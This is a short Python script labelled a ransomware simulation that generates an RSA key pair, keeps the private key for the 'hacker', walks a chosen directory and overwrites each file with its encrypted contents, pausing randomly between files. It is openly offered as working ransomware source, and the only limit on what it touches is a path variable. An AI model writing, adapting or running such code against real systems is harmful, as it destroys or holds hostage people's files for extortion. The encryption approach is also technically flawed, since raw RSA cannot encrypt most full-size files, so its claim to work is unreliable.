# RANSOMEWARE SIMULATION
# IT WORKS, USE THIS WITH YOUR OWN RISK :| 

#pip install rsa 

import time
import random
import os

import sys
sys.path.append('C:\\Users\\Admin\\AppData\\Roaming\\Python\\Python311\\site-packages') # change this for your system
import rsa



def list_files(directory):    
    file_paths = []
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            file_paths.append(file_path)
    return file_paths


# Directory to simulation here: 
DIRECTORY_PATH = "D:\\inputtest"

print(">> This is ransom simulation (rsa-pub-key file encrypting & priv-key for decrpyting) ..")
time.sleep(3)

#==================================================
# 1. rsa gen keys (privkey save to file)

# 1.1 - Generate a public and private key
(public_key, private_key) = rsa.newkeys(1024)

# 1.2 Save the private key to a file --> hacker keep this
private_key_file_path = 'private_key.pem'

with open(private_key_file_path, 'wb') as f:
    pem = private_key.save_pkcs1('PEM')
    f.write(pem)
    print("private key saved to: ", private_key_file_path)

#==================================================
# 2. encrypt the list file (ransome acts.)

encrypted_contents = ""

all_files = list_files(DIRECTORY_PATH)

for file_path in all_files:
  # random sleep for detecting
  time.sleep(random.uniform(3, 6))
  
  try:
    with open(file_path, 'rb') as file:
      file_contents = file.read()
    
      # Encrypt the file contents
      encrypted_contents = rsa.encrypt(file_contents, public_key)
      print(file_path, " --> is ecrypted to: ")
      print(encrypted_contents)

    with open(file_path, 'wb') as f:
      f.write(encrypted_contents)
  except FileNotFoundError:
    print("Error: the file does not exist.")
  except PermissionError:
    print("Error: don't have permission to access file.")
  except Exception as e:
    print(f"An unexpected error occurred, contact Andrew :) -> {e}")


